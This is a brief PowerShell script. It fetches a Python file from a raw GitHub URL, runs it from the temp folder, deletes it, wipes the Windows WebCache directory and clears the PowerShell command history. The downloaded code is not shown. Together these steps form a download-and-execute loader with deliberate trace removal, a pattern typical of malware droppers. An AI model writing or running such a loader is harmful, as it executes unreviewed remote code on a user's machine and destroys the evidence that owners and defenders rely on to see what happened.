# Download Python script
$scriptUrl = "https://raw.githubusercontent.com/Jamesbond83759/CloseAllApplications_Windows/main/script.py"
$savePath = "$env:temp\script.py"
(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)

# Execute Python script
& python $savePath

# Delete the downloaded script
Remove-Item $savePath

# Clear the download history from the system's web cache
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*" -Recurse -Force

# Clear the PowerShell command history
Clear-History
